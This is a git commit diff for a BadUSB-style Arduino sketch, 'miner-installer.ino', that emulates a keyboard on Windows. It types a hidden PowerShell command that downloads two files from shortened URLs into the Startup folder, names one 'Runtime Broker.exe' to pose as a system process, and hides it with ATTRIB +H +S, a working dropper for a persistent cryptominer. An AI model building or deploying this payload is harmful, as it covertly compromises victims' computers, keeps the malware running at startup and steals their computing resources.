bc1149935ef2fdf8fd280b06b798f7b838c2cf66
TyraVex <34800546+TyraVex@users.noreply.github.com>
2021-11-14 03:16:09 +0100

    Add files via upload

--- miner-installer/miner-installer.ino
+++ miner-installer/miner-installer.ino
@@ -1,10 +1,11 @@
 #include "DigiKeyboardFr.h"
 
 void setup() {
-  //open powershell
+  //opens windows run
   DigiKeyboardFr.delay(1);
   DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
   DigiKeyboardFr.delay(50);
+  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs";ATTRIB +H +S *.exe
   DigiKeyboardFr.println("powershell -windowstyle hidden -command \"cd \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\";iwr 3.ly/acKvl -o \\\"Runtime Broker.exe\\\";iwr 3.ly/acKvu -o System.vbs\";ATTRIB +H +S *.exe");
 }
 
